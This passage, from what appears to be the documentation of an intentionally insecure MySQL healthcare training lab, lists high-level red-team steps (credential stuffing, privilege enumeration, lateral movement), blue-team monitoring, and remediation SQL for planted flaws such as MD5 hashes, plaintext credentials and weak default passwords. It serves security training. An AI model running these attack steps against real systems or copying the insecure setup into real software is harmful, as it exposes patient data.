-- If IP geolocation available:
SELECT user_id, username, ip_address, COUNT(*) as access_count
FROM audit_log
WHERE timestamp > NOW() - INTERVAL 24 HOUR
GROUP BY user_id, ip_address
HAVING COUNT(DISTINCT ip_address) > 3;  -- Multiple IPs for same user
```

---

### Testing Recommendations

**For Red Team:**
1. Start with port scan to identify MySQL
2. Attempt credential stuffing with common passwords
3. If access gained, enumerate schema and privileges
4. Look for comments table (high-value target)
5. Attempt lateral movement with harvested credentials
6. Document TTPs and create detection opportunities

**For Blue Team:**
1. Monitor for patterns above
2. Implement query logging and analysis
3. Set up alerts for suspicious activity
4. Test incident response procedures
5. Practice data breach containment

---

## Remediation Guide

### Critical Fixes (Production)

**1. Password Security:**
```sql
-- Use bcrypt or Argon2 instead of MD5
-- PHP example:
$hash = password_hash($password, PASSWORD_ARGON2ID, ['memory_cost' => 2048, 'time_cost' => 4, 'threads' => 3]);

-- Verify:
password_verify($input_password, $stored_hash);
```

**2. Least Privilege:**
```sql
-- Revoke ALL from ehrapp
REVOKE ALL PRIVILEGES ON healthcare_db.* FROM 'ehrapp'@'%';

-- Grant only what's needed
GRANT SELECT, INSERT, UPDATE ON healthcare_db.patients TO 'ehrapp'@'webapp_host';
GRANT SELECT, INSERT ON healthcare_db.audit_log TO 'ehrapp'@'webapp_host';
-- etc. for each table
```

**3. Encrypt Sensitive Data:**
```sql
-- Use MySQL's AES encryption
ALTER TABLE patients 
  MODIFY COLUMN ssn VARBINARY(255);

-- Encrypt on insert:
INSERT INTO patients (ssn) VALUES (AES_ENCRYPT('123-45-6789', @encryption_key));

-- Decrypt on read:
SELECT AES_DECRYPT(ssn, @encryption_key) as ssn FROM patients;
```

**4. Network Security:**
```yaml
# docker-compose.yml
ports:
  - "127.0.0.1:3306:3306"  # Localhost only, not exposed externally
```

**5. Remove Plaintext Credentials:**
```sql
-- DELETE all plaintext passwords
DELETE FROM comments WHERE plaintext_credential IS NOT NULL;

-- Use secrets management instead:
-- - HashiCorp Vault
-- - AWS Secrets Manager
-- - Azure Key Vault
```

**6. Strong Passwords:**
```bash
# Generate strong passwords:
openssl rand -base64 32

# Enforce password policy in MySQL:
INSTALL COMPONENT 'file://component_validate_password';
SET GLOBAL validate_password.length = 14;
SET GLOBAL validate_password.mixed_case_count = 1;
SET GLOBAL validate_password.number_count = 2;
SET GLOBAL validate_password.special_char_count = 2;
```

**7. Audit Logging:**
```sql
-- Enable audit log plugin
INSTALL PLUGIN audit_log SONAME 'audit_log.so';

-- Configure to log all queries:
SET GLOBAL audit_log_policy = 'ALL';
SET GLOBAL audit_log_format = 'JSON';
```

**8. Remove Test Accounts:**
```sql
DROP USER 'dev'@'%';
DROP USER 'test'@'%';
DROP USER 'demo'@'%';
```

---

## Summary

This MySQL database contains **intentional, critical security vulnerabilities** including:

✅ **50 synthetic patients** with realistic PHI data  
✅ **200+ medical records** with detailed clinical information  
✅ **MD5 password hashing** (cryptographically broken)  
✅ **Plaintext credentials** in comments table  
✅ **Weak passwords** (admin123, password, backup123)  
✅ **Overly permissive users** (ALL PRIVILEGES)  
✅ **Unencrypted PII/PHI** (SSNs, diagnoses, medications)  
✅ **Exposed database port** (3306 to host)  
✅ **Insufficient audit logging**  
✅ **No encryption at rest**  
✅ **Remote root access**  

**MITRE ATT&CK Coverage:**
- T1078 (Valid Accounts)
- T1552.001 (Unsecured Credentials - Files)
- T1110.001/002 (Brute Force)
- T1068 (Privilege Escalation)
- T1213 (Data from Information Repositories)
- T1048 (Exfiltration)
- T1485/1486/1491 (Impact)

**Use Cases:**
- Red team training and assessment
- Blue team detection and response practice
- Security awareness training
- Penetration testing validation
- HIPAA compliance testing scenarios

---

**⚠️ FINAL WARNING ⚠️**

This database is **designed to be insecure**. Never use these configurations in production. Always follow security best practices, compliance requirements (HIPAA, PCI-DSS), and the principle of least privilege.

---

*Document Version: 1.0*  
*Last Updated: 2024-01-28*  
*Project: MEDUSA Healthcare Security Lab*

